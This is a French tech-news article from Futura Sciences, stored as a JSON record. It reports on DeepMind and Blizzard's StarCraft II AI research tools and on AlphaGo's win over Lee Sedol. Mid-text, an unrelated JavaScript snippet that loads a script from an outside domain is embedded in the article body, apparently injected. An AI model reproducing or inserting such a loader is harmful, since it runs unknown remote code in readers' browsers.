{"title": "DeepMind, l'IA de Google, déclare la guerre sur StarCraft II", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "10/08/2017", "content": "DeepMind et l'éditeur Blizzard viennent de publier de précieux outils. Ceux-ci permettront aux chercheurs en intelligence artificielle (IA) de créer des agents virtuels capables d'affronter les humains à armes égales au jeu de stratégie StarCraft II. Ce qu'il faut retenir Pour une intelligence artificielle, un jeu de stratégie en temps réel comme StarCraft II représente un défi bien plus complexe que le jeu de go. DeepMind et StarCraft ont créé des outils et une base de données de 65.000 parties pour les chercheurs en intelligence artificielle. Une IA capable de battre les humains à StarCraft II pourrait avoir de nombreuses applications concrètes dans le monde réel. Maintenant qu'elle a définitivement démontré sa supériorité sur les humains au  jeu de go , DeepMind, la filiale de  Google  spécialisée en  intelligence artificielle  (IA), s'est lancée dans un nouveau défi : battre des humains à  StarCraft  II. L'entreprise avait annoncé ce nouveau programme de recherche fin 2016 et indiqué que des outils spécifiques seraient mis à la disposition des chercheurs en  intelligence artificielle  courant 2017. C'est désormais chose faite. DeepMind et Blizzard Entertainment (éditeur de ce jeu de stratégie en temps réel) viennent d'annoncer la sortie d'un ensemble d'outils grâce auxquels les spécialistes vont pouvoir développer des agents informatiques ( bots  en anglais) capables d'affronter des joueurs humains. Pour cela, ils auront à leur disposition une interface de programmation ( API ) d'apprentissage automatique ( machine learning ) qu'ils pourront notamment utiliser dans un environnement  Linux . Une  base de données  de 65.000 parties anonymes est également à disposition pour entraîner les IA ; DeepMind prévoit de la faire grandir jusqu'à 500.000 parties dans les semaines qui viennent. Cette capture d’écran montre une séquence d’entraînement d’une IA sur StarCraft II. Dans son commentaire, DeepMind explique que ses  bots  ont encore du mal à gérer des tâches mineures, comme la collecte de minéraux ( Collect Mineral Shards ). © DeepMind, Blizzard                               Plus de 300 actions de base dans StarCraft II La trousse à outils de DeepMind contient aussi des miniparties qui permettent de tester les capacités d'une IA sur des actions particulières comme la collecte de minéraux, la sélection d'une unité ou le déplacement de la caméra.  DeepMind  et Blizzard ont publié un article scientifique qui rend compte de leurs travaux initiaux et des premiers résultats obtenus. Celui-ci permet de constater qu'il y a encore du pain sur la planche.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  En effet, de nombreuses actions considérées comme basiques pour un joueur humain ne sont pas encore maîtrisées par les  bots . Or, il existe plus de 300 actions de base possibles dans StarCraft II, sans compter leurs  déclinaisons . Pour le moment, aucun agent n'est en mesure de remporter une partie complète reconnaît DeepMind. C'est aussi la raison pour laquelle la filiale de Google a choisi l'ouverture à la communauté des chercheurs en IA : cela va lui permettre de progresser encore plus rapidement. Sorti en 2010, StarCraft II concentre beaucoup de complications qui représentent un défi technique de taille pour une  intelligence artificielle . L'objectif principal est de battre l'adversaire, mais cela implique la réussite d'un certain nombre d'objectifs annexes comme la collecte et la gestion des ressources, la construction et l'évolution des infrastructures et des armes, l'entraînement des combattants, etc. Par ailleurs, StarCraft II est un jeu à information imparfaite. La carte géographique n'est que partiellement visible, ce qui signifie que l'IA doit développer un jeu basé sur la mémoire et la planification. En outre, une partie peut durer aussi bien une poignée de minutes qu'une bonne heure, ce qui veut dire que des choix stratégiques décidés en début de jeu peuvent porter leurs fruits seulement à la fin du combat. Bref, la gestion de la part d'incertitude est beaucoup plus complexe. Encore 5 ans pour qu'une IA batte un humain à StarCraft II ? Des essais ont déjà été conduits avec la première version de StarCraft pendant des années, mais les  logiciels  appliquaient des stratégies préprogrammées et ne reposaient pas sur de l'apprentissage automatique. Les spécialistes estiment qu'une intelligence artificielle performante à StarCraft II serait à même d'accomplir des tâches complexes, ce qui ouvre la voie à de nombreuses  applications  dans le monde réel. Pour Google, le succès de cette mission n'a rien de symbolique. Il mènera à une monétisation de l'IA dans divers domaines. Selon  David Churchill , professeur à l'université  Memorial  de Terre-Neuve qui a conseillé DeepMind sur ce projet, il faudra cinq ans avant qu'une IA StarCraft puisse battre un humain. Rappelons qu'un an avant la première victoire de l'IA Alpha Go contre un humain, les experts n'imaginaient pas un tel scénario avant au moins une décennie. DeepMind les fera-t-elle mentir à nouveau ? À suivre... Pour en savoir plus DeepMind, l'IA de Google, va s'attaquer à StarCraft II Article initial de  Marc Zaffagni , paru le 7/11/2016 Après le jeu de go, DeepMind, la filiale de Google, compte entraîner son intelligence artificielle pour vaincre au jeu de stratégie en temps réel StarCraft II. Un défi technique encore plus relevé qui est susceptible d'offrir à une IA des compétences précieuses pour accomplir des tâches de la vie réelle. Comme elle l'avait annoncé il y a quelques mois après la victoire retentissante de son intelligence artificielle (IA) contre le champion du jeu de go, la société DeepMind va désormais s'intéresser au jeu vidéo StarCraft II. À l'occasion de la conférence annuelle de Blizzard Entertainment, l'éditeur de ce titre de stratégie en temps réel qui voit des joueurs professionnels s'affronter dans le monde entier,  DeepMind  a officialisé un nouveau programme de recherche. Il vise à créer une plateforme ouverte à tous les chercheurs qui voudront développer une IA capable de battre un joueur humain. Le défi s'annonce encore plus complexe qu'il le fut pour le go. En effet, dans ce jeu, l'IA avait une vision complète du jeu de l'adversaire sur le plateau. Ce n'est pas le cas dans StarCraft ou d'autres jeux de stratégie en temps réel dans lesquels les joueurs ne voient pas ce que fait leur rival. Chacun doit à la fois gérer ses ressources, mener des missions de reconnaissance et développer des tactiques offensives et défensives. « Les compétences requises pour qu'un agent  [une IA,  NDLR ]  puisse progresser dans l'environnement et jouer à StarCraft pourraient à terme être appliquées à des tâches de la vie réelle » , explique DeepMind. De son côté, Blizzard Entertainment compte sur ce projet pour faire progresser l'intelligence artificielle de son jeu phare et vraisemblablement celle de ses titres à venir. Voici à quoi ressemblera l’interface graphique simplifiée de StarCraft II mise à disposition des chercheurs par Blizzard Entertainment et DeepMind. L’objectif est de fournir des données visuelles afin que les IA apprennent à jouer sur les mêmes bases que les humains. © DeepMind  Une plateforme ouverte à tous les chercheurs en intelligence artificielle Début 2017, DeepMind et Blizzard vont mettre à disposition des chercheurs en IA un environnement de travail sur StarCraft II avec une interface graphique simplifiée plus adaptée aux systèmes d'apprentissage automatique accompagnée d'une API (interface de programmation). Par ailleurs, Blizzard fournira des enregistrements de parties de StarCraft II qui viendront alimenter une base de données dans lesquelles les IA pourront puiser pour apprendre à jouer à partir d'informations visuelles, exactement comme un humain. Malgré le succès rencontré avec le jeu de go, DeepMind estime que le projet StarCraft est encore plus ambitieux. La filiale de Google ne s'est d'ailleurs pour le moment pas avancée à défier un joueur professionnel. Mais rappelons que peu de temps avant la victoire d' AlphaGo  (l'IA développée par DeepMind) face à un joueur de go, les meilleurs spécialistes en IA estimaient qu'il faudrait encore une décennie pour parvenir à un tel résultat... Après sa victoire au jeu de go, l’IA de Google pense aux jeux vidéo Article initial de Marc Zaffagni, paru le 15/03/2016 Lors du cinquième et dernier match de jeu de go qui s'est avéré très disputé,  AlphaGo  l'a finalement emporté face au champion sud-coréen Lee Sedol. Avec quatre victoires, le programme d'intelligence artificielle a démontré ses formidables capacités. Quel sera son prochain défi ? Peut-être se confronter à un jeu vidéo de stratégie comme StarCraft. Quatrième victoire pour  AlphaGo  face à Lee Sedol. La dernière partie de ce tournoi de go mettant aux prises l'Homme et la machine a tenu ses promesses. Après la victoire de  Lee Sedol  lors du quatrième match, le rapport de force semblait plus équilibré. En effet, cet ultime affrontement qui s'est joué en 280 coups s'est avéré serré et très intense. AlphaGo a commis une erreur en début de partie mais il a réussi à redresser la situation. Les deux opposants n'ont rien lâché. Cependant, AlphaGo s'est octroyé un léger avantage aux points qui a conduit Lee Sedol à jeter l'éponge. L' intelligence artificielle  (IA) développée par la société britannique DeepMind (filiale de Google) s'est donc adjugé quatre victoires en cinq parties. Le prix d'un million de dollars qui était en jeu sera reversé à l'Unicef, des œuvres de charité et des associations de jeu de go. Lors de la conférence de presse d'après-match, Lee Sedol s'est dit ravi de cette expérience. Il a expliqué que, d'après lui, le plus grand avantage que possédait AlphaGo était d'ordre psychologique. Contrairement à un joueur humain, la machine n'est pas sujette aux émotions ; elle n'est pas impressionnée par les enjeux et son niveau de concentration n'est pas susceptible de varier au cours de la partie.  Le champion sud-coréen a estimé que la créativité et l'aspect psychologique sont deux domaines dans lesquels les humains ont une marge de progression qui peut leur laisser une chance de battre une intelligence artificielle au jeu de go.  « Je ne pense pas qu'AlphaGo soit supérieure à moi. Je crois qu'un humain peut faire plus face à une intelligence artificielle, a commenté Lee Sedol. Ma défaite n'est pas une défaite de l'humanité. Cela a montré mes propres faiblesses, pas celles de l'humanité ».  Lee Sedol vient d’abandonner la partie dans le cinquième et dernier match qui l’opposait à l’intelligence artificielle AlphaGo. © DeepMind, YouTube                               AlphaGo pourrait jouer à StarCraft Reste que la domination d'AlphaGo est sans appel et qu'elle a fait franchir un cap décisif à l'IA. Quelle sera la prochaine étape ? Interrogé à ce sujet, Demis Hassabis, le patron de DeepMind, a évoqué la possibilité d'organiser d'autres tournois de go contre des joueurs de haut niveau. Il pourrait s'agir de Ke Jie, un jeune prodige chinois de 18 ans qui est actuellement numéro 1 mondial. Il est également question de rendre AlphaGo disponible pour le grand public mais ce n'est pas tout... Lors d'un entretien avec le site  The Verge , Demis Hassabis a cité la possibilité d'organiser une confrontation Homme-machine autour du jeu vidéo StarCraft. Ce jeu de stratégie sorti en 1998 qui est l'une des références du genre pourrait représenter un défi peut-être encore plus complexe que celui qu'AlphaGo vient de relever.  En effet, le go est un jeu dit à information parfaite, où les joueurs ont une vision complète du jeu de l'adversaire sur le plateau. Dans un jeu comme StarCraft, chaque joueur développe sa stratégie offensive et défensive sans voir ce que fait l'adversaire. Il y a donc une part d'incertitude qui rend la prise de décision plus difficile et imprévisible. Il serait donc tout à fait intéressant d'observer comment une intelligence artificielle se comporterait dans ces conditions.  Pour Demis Hassabis, qui fut lui-même un développeur de jeux vidéo réputé, l'objectif n'est pas de faire « jouer » une IA juste pour relever des défis.  « Bien que cela soit amusant et enthousiasmant, le but de DeepMind n'est pas juste de gagner à des jeux  [...]  Il faut qu'ils soient utiles en tant que banc d'essai, une plateforme pour essayer nos algorithmes, tester jusqu'où ils peuvent aller » . À terme, l'idée de DeepMind et de  Google  est bel et bien d'exploiter les capacités d'une intelligence artificielle dans divers domaines concrets. À plusieurs reprises, Demis Hassabis a cité la santé, la science, la  robotique  et les assistants virtuels pour  smartphones  comme les débouchés les plus évidents.  « À l'heure actuelle, à peu près tous les assistants de  smartphones  sont préprogrammés et cela signifie qu'ils sont fragiles car ils ne peuvent faire que les choses pour lesquelles ils ont été préprogrammé » . Il pense que d'ici quatre à cinq ans, les  assistants virtuels  vont devenir beaucoup plus adaptatifs sous l'influence d'une IA qui apprendra en temps réel et saura mieux s'adapter à un contexte.  La science est un autre domaine dans lequel le fondateur de DeepMind voit beaucoup de promesses.  « J'aimerais voir une science où une IA serait un assistant de recherche faisant tout le travail fastidieux de trouver des articles intéressants, d'identifier une structure dans une vaste quantité de données pour les faire remonter aux experts humains et aux scientifiques qui pourraient avancer plus rapidement » . Cependant, tout ceci va prendre encore beaucoup de temps avant d'aboutir. La victoire d'AlphaGo n'est pas un aboutissement pour l'intelligence artificielle, c'est plutôt un commencement.  Playlist : tout savoir sur le transhumanisme, la robotique et l'intelligence artificielle                       Jean-Claude Heudin, directeur de l'IIM (institut de l'Internet et du multimédia) nous parle de sa vision du transhumanisme, du futur de l'intelligence artificielle et des robots durant cette série d'interviews réunies sous forme de playlist.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  jeux starcraft  |  comment attaquer site web", "theme": "tech"}